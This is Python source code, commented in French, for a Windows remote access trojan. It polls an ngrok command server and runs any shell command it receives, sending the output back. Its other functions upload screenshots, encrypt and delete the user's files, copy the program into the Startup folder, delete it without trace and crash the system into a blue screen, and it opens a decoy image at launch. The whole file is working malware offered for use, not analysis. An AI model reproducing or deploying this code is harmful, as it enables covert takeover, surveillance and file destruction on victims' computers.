import requests
import subprocess
import time
import os
import subprocess
import tempfile
import requests
import shutil
from cryptography.fernet import Fernet
import psutil
import os
import sys
import ctypes
from PIL import ImageGrab  # Ajoutez en haut avec les autres imports
import io
import time

SERVER_URL = "https://dynamic-visually-barnacle.ngrok-free.app"  # Remplace par ton URL ngrok HTTPS

def get_command():
    try:
        r = requests.get(f"{SERVER_URL}/get_command", timeout=10)
        if r.status_code == 200:
            return r.json().get("command", "")
    except:
        pass
    return ""

def send_result(output):
    try:
        requests.post(f"{SERVER_URL}/send_result", json={"output": output}, timeout=10)
    except:
        pass



def open_image(url):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        
        with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp_file:
            for chunk in response.iter_content(1024):
                tmp_file.write(chunk)
            tmp_path = tmp_file.name
        
        os.startfile(tmp_path)
    except Exception as e:
        print(f"Erreur : {e}")

def list_processes():
    try:
        process_list = []
        for process in psutil.process_iter(['pid', 'name']):
            try:
                process_info = {
                    'pid': process.info['pid'],
                    'name': process.info['name']
                }
                process_list.append(process_info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return str(process_list)  # Convertir en chaîne pour l'envoi
    except Exception as e:
        return f"Erreur: {str(e)}"


def send_screenshot():
    screenshot = ImageGrab.grab()
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    buffer.seek(0)
    files = {'screenshot': ('screenshot.png', buffer, 'image/png')}
    try:
        r = requests.post(f"{SERVER_URL}/upload_screenshot", files=files, timeout=15)
        if r.status_code == 200:
            send_result("Screenshot envoyé avec succès")
        else:
            send_result(f"Erreur serveur screenshot: {r.status_code}")
    except Exception as e:
        send_result(f"Erreur envoi screenshot: {str(e)}")

def self_delete():
    exe_path = sys.executable
    if exe_path.endswith(".exe"):
        bat_path = exe_path + ".bat"
        with open(bat_path, "w") as f:
            f.write(f"""
@echo off
timeout /t 1 >nul
del "{exe_path}"
del "%~f0"
""")
        # Lance le .bat et quitte immédiatement
        subprocess.Popen(f'start /min "" "{bat_path}"', shell=True)
        os._exit(0)  # <-- quitte immédiatement sans attendre


def generate_key():
    key = Fernet.generate_key()
    with open(f"C:\\users\\{os.getlogin()}\\secret.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open(f"C:\\users\\{os.getlogin()}\\secret.key", "rb").read()

def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted = f.encrypt(data)
    with open(file_path + ".enc", "wb") as file:
        file.write(encrypted)
    os.remove(file_path)  # Supprimer le fichier original après le chiffrement

def decrypt_file(encrypted_path, key):
    f = Fernet(key)
    with open(encrypted_path, "rb") as file:
        encrypted_data = file.read()
    decrypted = f.decrypt(encrypted_data)
    with open(encrypted_path.replace(".enc", ""), "wb") as file:
        file.write(decrypted)
    os.remove(encrypted_path)  # Supprimer le fichier chiffré après le déchiffrement



def main():
    while True:
        command = get_command()
        if command:
            if command == "exit":
                break


            elif command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    send_result(f"Changed directory to {os.getcwd()}")
                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.startswith("mkdir "):
                try:
                    os.mkdir(command[6:].strip())
                    send_result(f"Directory {command[6:].strip()} created")
                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.strip() == "dir":
                try:
                    files = os.listdir()
                    send_result("\n".join(files))
                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.startswith("del "):
                try:
                    if os.path.isdir(command[4:].strip()):
                        shutil.rmtree(command[4:].strip())
                        send_result(f"directory {command[4:].strip()} deleted")
                    else:
                        os.remove(command[4:].strip())
                        send_result(f"File {command[4:].strip()} deleted")

                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.strip() == "reboot":
                try:
                    send_result("client rebooted")
                    os.system("shutdown /r /t 1")

                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.strip() == "shutdown":
                try:
                    send_result("client shutdown")
                    os.system("shutdown /s /t 1")
                    
                except Exception as e:
                    send_result(f"Error: {str(e)}")



            elif command.startswith("messagebox "):
                try:

                    ctypes.windll.user32.MessageBoxW(0, command[11:].strip(), "Message", 1)
                    send_result(f"messagebox {command[11:].strip()} displayed")

                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.startswith("encrypt "):
                try:
                    if (not os.path.exists(f"C:\\users\\{os.getlogin()}\\secret.key")):
                        generate_key()
                    
                    target = command[8:].strip()

                    if os.path.isdir(target):
                        for root, _, files in os.walk(target):
                            for file in files:
                                encrypt_file(os.path.join(root, file), load_key())
                        
                        send_result(f"Directory {target} encrypted")
                    
                    else:
                        encrypt_file(target, load_key())
                        send_result(f"File {target} encrypted")
                
                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.startswith("decrypt "):
                try:
                    if (not os.path.exists(f"C:\\users\\{os.getlogin()}\\secret.key")):
                        send_result("Key not found.")
                    
                    target = command[8:].strip()

                    if os.path.isdir(target):
                        for root, _, files in os.walk(target):
                            for file in files:
                                decrypt_file(os.path.join(root, file), load_key())
                        
                        send_result(f"Directory {target} decrypted")
                    
                    else:
                        decrypt_file(target, load_key())
                        send_result(f"File {target} decrypted")
                
                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.strip() == "kill":
                try:
                    send_result("client deleted")
                    self_delete()
                    break
                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.strip() == "startup":
                try:
                    fichier_source = os.path.basename(sys.executable)
                    dossier_destination = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

                    shutil.copy(fichier_source, dossier_destination)

                    send_result("client copied to startup folder")

                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.strip() == "screenshot":
                send_screenshot()

            
            elif command.startswith("urlimage "):
                try:
                    url = command[9:].strip()
                    open_image(url)
                    send_result(f"Image opened from {url}")
                except Exception as e:
                    send_result(f"Error: {str(e)}")


            elif command.strip() == "bluescreen":
                try:
                    send_result("Blue screen triggered")

                    ntdll = ctypes.WinDLL('ntdll.dll')
                    privilege = ctypes.c_ulong()
                    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(privilege))
                    response = ctypes.c_ulong()
                    ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(response))

                except Exception as e:
                    send_result(f"Error: {str(e)}")



            elif command.strip() == "tasklist":
                try:
                    processes = list_processes()
                    send_result(processes)
                except Exception as e:
                    send_result(f"Error: {str(e)}")



            elif command.startswith("taskkill "):
                try:
                    pid = int(command[9:].strip())
                    process = psutil.Process(pid)
                    process.terminate()
                    send_result(f"Process {pid} terminated")
                except psutil.NoSuchProcess:
                    send_result(f"Process {pid} not found")
                except psutil.AccessDenied:
                    send_result(f"Access denied to terminate process {pid}")
                except Exception as e:
                    send_result(f"Error: {str(e)}")










            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    send_result(output.decode())
                except subprocess.CalledProcessError as e:
                    send_result(e.output.decode())
        time.sleep(3)

if __name__ == "__main__":
    open_image("https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcQkKDfJl_0guAi2yQ2dakB1nMhcHxtQE0CqtywdwAmMvaIuwg3e")
    main()